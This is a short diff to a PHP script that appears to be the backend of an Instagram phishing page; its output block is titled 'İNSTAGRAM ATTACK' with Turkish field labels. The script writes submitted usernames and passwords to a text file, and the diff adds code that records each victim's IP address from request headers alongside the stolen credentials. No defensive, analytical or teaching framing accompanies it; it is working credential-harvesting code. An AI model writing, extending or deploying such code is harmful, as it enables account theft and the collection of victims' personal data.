@@ -1,6 +1,17 @@
 <?php
-//include "test.php";
 
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
+    }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
+    }
 if (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['saldiri'])) {
 
 $save = fopen("saved_info.txt","a+");
@@ -13,6 +24,8 @@ $vericekilen = ("
 +-+-+ İNSTAGRAM ATTACK +-+-+
 
  Tarih         : ".$tarih."
+ 
+ İp Adresi     : ".$ipaddress."
 
  Kullanıcı Adı : ".$username."
 
